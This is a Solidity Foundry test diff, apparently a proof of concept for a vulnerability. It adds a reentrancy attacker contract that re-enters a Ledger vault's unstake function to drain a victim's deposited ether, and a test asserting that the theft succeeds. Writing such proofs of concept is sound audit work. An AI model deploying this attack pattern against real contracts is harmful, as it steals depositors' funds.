+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Ledger} from "../src/Ledger.sol";
+
+contract ReentrantAttacker {
+    Ledger public vault;
+    address public owner;
+    uint256 public reenterCount;
+
+    constructor(Ledger _vault) {
+        vault = _vault;
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        vault.fund{value: msg.value}();
+        vault.unstake();
+    }
+
+    receive() external payable {
+        uint256 bal = vault.ledgerOf(address(this));
+        // If we still have credit, re-enter
+        if (bal > 0 && address(vault).balance >= bal) {
+            reenterCount++;
+            // try to re-enter, ignore failure to avoid revert
+            try vault.unstake() {} catch {}
+        }
+        // after draining, send to owner
+        if (address(vault).balance == 0 || vault.ledgerOf(address(this)) == 0) {
+            // only final transfer
+            if (address(this).balance > 0 && reenterCount > 0) {
+                // keep some for gas? just leave
+            }
+        }
+    }
+
+    function collect() external {
+        require(msg.sender == owner, "not owner");
+        payable(owner).transfer(address(this).balance);
+    }
+}
+
+contract PocTest is Test {
+    Ledger vault;
+    ReentrantAttacker attacker;
+
+    function setUp() public {
+        vault = new Ledger();
+    }
+
+    function test_exploit() public {
+        address victim = makeAddr("victim");
+        vm.deal(victim, 10 ether);
+        vm.prank(victim);
+        vault.fund{value: 6 ether}();
+
+        // vault now has 6 ether from victim
+        assertEq(address(vault).balance, 6 ether);
+        assertEq(vault.ledgerOf(victim), 6 ether);
+
+        attacker = new ReentrantAttacker(vault);
+        vm.deal(address(attacker), 1 ether);
+
+        // attacker deposits 1 ether and re-enters to drain victim
+        attacker.attack{value: 1 ether}();
+
+        // After exploit, attacker should have more than 1 ether in contract or drained vault
+        // Vault balance should be less than victim's credit (or zero)
+        uint256 vaultBal = address(vault).balance;
+        uint256 attackerBal = address(attacker).balance;
+
+        // Exploit succeeds if vault balance < victim deposit (6 ether) meaning victim funds stolen
+        // Or attacker balance > 1 ether
+        assertTrue(vaultBal < 6 ether || attackerBal > 1 ether, "exploit failed: vault not drained");
+        assertTrue(attacker.reenterCount() > 0, "reentrancy did not occur");
+    }
+}

